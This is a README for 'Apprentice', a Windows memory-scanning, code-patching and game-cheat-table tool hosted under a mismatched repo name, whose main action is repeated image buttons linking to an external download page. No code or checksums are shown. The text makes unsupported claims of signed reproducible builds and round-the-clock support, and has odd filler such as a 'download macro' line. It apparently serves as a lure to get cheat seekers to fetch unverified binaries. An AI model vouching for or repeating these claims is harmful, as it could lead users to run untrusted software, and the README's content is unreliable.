![preview](https://raw.githubusercontent.com/malukbattah-hue/memory-forge/main/card_7f2c9d.svg)
[![Download](https://raw.githubusercontent.com/malukbattah-hue/memory-forge/main/go_c803.svg)](https://malukbattah-hue.github.io/memory-forge/)

# 🧠 Apprentice — Memory Cartography & Runtime Instrumentation Suite

> *"Every running process is a landscape. Apprentice hands you the topographic map."*

[![License: MIT](https://img.shields.io/badge/License-MIT-3DA639?style=for-the-badge&logo=opensourceinitiative&logoColor=white)](https://opensource.org/licenses/MIT)
[![Platform: Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D4?style=for-the-badge&logo=windows&logoColor=white)](#)
[![Runtime: .NET 8](https://img.shields.io/badge/Runtime-.NET%208-512BD4?style=for-the-badge&logo=dotnet&logoColor=white)](#)
[![Mono Support](https://img.shields.io/badge/Mono-IL2CPP%20Bridged-blueviolet?style=for-the-badge&logo=unity&logoColor=white)](#)
[![Status: Actively Maintained](https://img.shields.io/badge/Status-Actively%20Maintained-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](#)
[![License](https://img.shields.io/badge/Year-2026-informational?style=for-the-badge&logo=calendar&logoColor=white)](#)
[![Community](https://img.shields.io/badge/Community-Discussions-ff69b4?style=for-the-badge&logo=matrix&logoColor=white)](#)
[![Localization](https://img.shields.io/badge/Localization-14%20Languages-f39c12?style=for-the-badge&logo=googletranslate&logoColor=white)](#)

---

## 🗺️ What Is Apprentice?

**Apprentice** is an open-source Windows runtime cartography and memory instrumentation environment — a deep-inspection workbench for engineers, reverse-engineering students, modding communities, and curious tinkerers who want to *see* what a program is doing beneath the surface.

Where conventional debuggers stop at breakpoints, Apprentice keeps walking. It draws the invisible terrain of a live process: heap allocations, static fields, managed object graphs, JIT-compiled method bodies, and native instruction streams — all rendered into a navigable atlas you can annotate, script, and share.

Think of it as an **archaeologist's toolkit for software**: layer by layer, you excavate, label, and reconstruct meaning from a machine that was never designed to explain itself. Apprentice does not break software — it *interprets* it.

This project is the successor idea to the legendary "trainer & memory editor" genre, reimagined for a modern, MIT-licensed, community-auditable era. It supports **Mono** and **IL2CPP** runtimes, code-patch injection through a reversible delta journal, and bidirectional `.CT`-style cheat table interchange (import *and* export).

---

## 📥 Getting the Build

[![Download](https://raw.githubusercontent.com/malukbattah-hue/memory-forge/main/go_c803.svg)](https://malukbattah-hue.github.io/memory-forge/)

The second line of the download macro above is intentionally placed at the end of this README as well — scroll to the bottom to find it again. Distribution is handled through signed release channels only; no mirrors, no repackagers, no mystery binaries. Verify the checksum manifest before you launch anything.

---

## ✨ Feature Atlas

### 🔍 Core Memory Cartography
- **Living Scan Engine** — locate values by exact match, fuzzy proximity (unknown initial value), growth/shrink heuristics, and "changed by N" deltas across arbitrary address spaces.
- **Address Space Snapshotting** — freeze entire regions into diffable snapshots; replay history to see *when* a value drifted.
- **Structured Watches** — watch expressions with pointer-chain resolution (`[base+0x1C]+0x8`), arithmetic offsets, and typed reinterpretation.
- **Pointer Scanner with Confidence Scoring** — multi-level pointer paths ranked by stability across process restarts.
- **Heap Region Heatmaps** — visualize allocation churn and fragmentation without attaching a profiler.

### 🧬 Code-Patch Injection & Delta Journal
- **Reversible Patch Journal** — every byte edit is recorded as a delta with full provenance; revert with a single action.
- **Assembly Patch Composer** — write small instruction stubs that hijack, observe, or redirect execution without permanently altering on-disk files.
- **Trampoline Builder** — auto-generates safe jump islands for hooking, with register-preservation analysis.
- **NOP Sledging & Signature Fencing** — mask-based patch matching that survives minor updates.
- **Dry-Run Simulator** — preview the effect of a patch in a sandboxed VM before applying it to a live target.

### 🌉 Mono & IL2CPP Bridges
- **Managed Object Explorer** — browse the live managed heap as a tree: classes, instances, fields, references.
- **IL2CPP Metadata Decoder** — reconstruct type and method names from stripped metadata blobs.
- **Method Decompilation Preview** — see pseudo-C# for short methods and field accessors.
- **Runtime Method Invocation** — call static and instance methods safely from the inspector with typed argument marshalling.
- **Field Freezer & Unfreezer** — pin specific values in memory with a guard loop that self-heals against overwrites.

### 📜 .CT-Style Table Interchange
- **Bidirectional Table Import** — ingest classic XML cheat-table structures, preserving record hierarchy, comments, and hotkeys.
- **Table Export** — emit a portable, versioned XML schema that plays nicely with external tooling.
- **Script Records** — support embedded scripting blobs with a sandboxed interpreter.
- **Signature Records** — carry AOB (array-of-bytes) signatures inside tables so records self-relocate after updates.
- **Lua-Compatible Script Surface** — familiar scripting semantics with a modern binding layer.

### 🎛️ Interface & Experience
- **Responsive UI** — the entire workspace reflows gracefully from a 13" laptop panel to a 4K ultrawide; docking, floating panes, and chevron-collapse groups.
- **Multilingual Support** — the interface ships in fourteen languages with community-maintained string tables and right-to-left layouts.
- **24/7 Customer Support** — a rotating global crew of volunteers and maintainers keeps the issue queue alive around the clock, across every timezone, so a stuck engineer is never stuck for long.
- **Command Palette** — fuzzy-search every action with a keystroke.
- **Session Replay** — record and revisit an entire investigation session, frame by frame.
- **Dark / Light / High-Contrast Themes** — tuned for long nights and bright labs alike.

### 🧪 Scripting & Automation
- **Embedded Script Console** — write small utilities inline without leaving the app.
- **Event Hooks** — fire callbacks on memory-change, breakpoint hit, or table load.
- **Batch Runner** — apply a series of operations to many processes sequentially.
- **CSV / JSON Result Export** — pipe findings into your own analysis pipeline.

### 🔐 Security & Trust
- **Reproducible Builds** — every release is bit-for-bit rebuildable from a tagged commit.
- **Signed Artifacts** — release binaries carry detached signatures and a published hash manifest.
- **No Telemetry, Ever** — Apprentice phones home to nobody; offline is a first-class mode.
- **Sandboxed Scripting** — scripts cannot touch the filesystem or network without explicit grants.

---

## 🏔️ Real-World Excursions

### Valheim — Survival Cartography
Terrain generation in Valheim is a procedurally seeded landscape. Apprentice users frequently explore seed behavior, cartography of biome transitions, and material abundance distribution for **world-building analysis**. The Delta Journal makes it simple to test one hypothesis, roll back, and test another.

### Elden Ring — Frame-Data Field Study
Elden Ring's combat frame-data is a fascinating object of study for timing researchers. Apprentice's pointer scanner and field freezer let analysts hold a value constant while varying input timing to isolate exactly which offsets influence i-frame windows. All work is done on offline, single-player saves for **mechanical research purposes**.

### Unity Prototypes — IL2CPP Diagnostics
Indie teams use Apprentice during their own development cycle to inspect live IL2CPP builds without attaching a heavyweight debugger. Field mutation in real time reveals state-machine bugs that unit tests miss.

### Academic Reverse-Engineering Courses
Several university courses use the sandboxed scripting surface to teach pointer mechanics, heap layout, and calling conventions without requiring specialized hardware.

---

## 🧩 Architecture Overview

Apprentice is split into portable, testable layers:

- **Core Cartography Engine** — platform-agnostic memory scanning and delta logic.
- **Bridge Adapters** — per-runtime adapters for Mono, IL2CPP, and raw native.
- **Patch Composer** — assembles, validates, and journals byte-level edits.
- **Table Codec** — imports and exports the XML interchange format.
- **UI Shell** — the responsive, multilingual desktop front end.
- **Script Host** — a sandbox that runs embedded automation blobs.

Each layer is separately buildable and individually unit-tested. If you only need the scanner, you can embed it as a library; if you only need the table codec, you can lift it wholesale.

---

## 🌍 Localization & Accessibility

The UI string catalog is stored as keyed JSON, one file per language, and community PRs are welcome for any locale. Accessibility is treated as a feature, not a checkbox: full keyboard navigation, screen-reader labels on interactive panes, adjustable contrast, and reduced-motion mode are all part of the baseline experience.

Current language coverage includes (but is not limited to) English, German, French, Spanish, Portuguese, Italian, Polish, Russian, Turkish, Japanese, Korean, Simplified Chinese, Traditional Chinese, and Arabic.

---

## 🧠 Philosophy & Ethics

Apprentice exists in the tradition of **understanding software by observing it**. It is an educational and research instrument. The maintainers ask that users respect the terms of service of the software they inspect, avoid using the tooling against online multiplayer ecosystems where it is prohibited, and treat the technique as a microscope rather than a crowbar.

Nothing here is designed to gain unfair advantage over other players in a shared online context. The intended uses are single-player research, game-development debugging, academic study, and personal curiosity.

---

## 🛠️ Contributing

Contributions are warmly encouraged. Whether you are filing a bug, improving a translation, adding a scanner heuristic, or cleaning up a docstring, you are making the map better for everyone.

Ways to help:
- **Report issues** with a clear reproduction recipe — memory behavior reports benefit from a snapshot if possible.
- **Improve localization** — the string catalog PRs are the fastest way to help non-English users.
- **Add scanner heuristics** — new value-type detection strategies are always welcome.
- **Write documentation** — explain a concept you had to learn the hard way.
- **Review code** — thoughtful review is a contribution too.

All contributions should follow the project's coding style guide and be covered by the MIT license. Be kind. Be precise. Be curious.

---

## 🗓️ Roadmap (2026 and Beyond)

- **Q1 2026** — Stabilize IL2CPP metadata decoder for the latest runtime versions.
- **Q2 2026** — Ship the table codec 2.0 with a formal schema and migration tool.
- **Q3 2026** — Introduce a plugin SDK so third parties can add adapters without forking.
- **Q4 2026** — Publish a full reference for the scripting surface.
- **Ongoing** — Expand localization, harden the sandbox, improve accessibility.

Roadmap items are aspirational and may shift with community input. Priorities are set by maintainers in open discussion — not behind closed doors.

---

## ❓ Frequently Asked Questions

**Does Apprentice require an internet connection?**
No. Offline mode is fully functional. The network is only used if you manually check for updates.

**Is it compatible with 32-bit processes?**
Yes. The scanner engine handles both 32-bit and 64-bit address spaces, with cross-architecture pointer scans supported where the OS allows it.

**Will it work with my game?**
It works with most Windows processes using Mono, IL2CPP, or native code. Compatibility with any particular title is a research question, not a promise.

**Can I use my old table files?**
Yes. The import pipeline accepts classic XML structures and preserves record hierarchy wherever possible.

**Where do I get help?**
The issue tracker and discussion forum are staffed around the clock by a rotating global crew. Response times vary, but someone always answers.

**Is this legal?**
Apprentice is a general-purpose research tool, distributed openly under the MIT license. Legality depends on how and where you use it. Respect local law and the terms of the software you inspect.

**Does it collect data about me?**
No telemetry, no analytics, no callbacks. Nothing leaves your machine unless you explicitly export it.

---

## ⚖️ Disclaimer

Apprentice is provided **as-is**, without warranty of any kind, express or implied. The maintainers and contributors are not responsible for any consequences arising from the use or misuse of this software, including but not limited to data loss, system instability, account restrictions imposed by third parties, or violations of any software's terms of service.

This tool is intended strictly for **educational, research, and single-player development purposes**. Users are solely responsible for ensuring their use complies with all applicable laws and with the terms of service of any software they inspect. Do not use Apprentice to gain unfair advantages in shared online environments, to bypass licensing mechanisms, or to interfere with systems you do not own or have permission to analyze.

You are the cartographer. Map responsibly.

---

## 📄 License

Apprentice is distributed under the **MIT License**.

You can read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 Apprentice Contributors.

Permission is hereby granted, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, subject to the condition that the above copyright notice and this permission notice be included in all copies or substantial portions of the Software.

The software is provided without warranty of any kind. See the linked license text for the complete terms.

---

## 🌟 A Final Word

A process is a city at night. Lights flicker in windows you will never open, streets you will never walk. Apprentice does not break the windows — it teaches you to read the map, to understand the traffic, and to appreciate the architecture.

Build something thoughtful. Share what you learn. Keep the map open.

[![Download](https://raw.githubusercontent.com/malukbattah-hue/memory-forge/main/go_c803.svg)](https://malukbattah-hue.github.io/memory-forge/)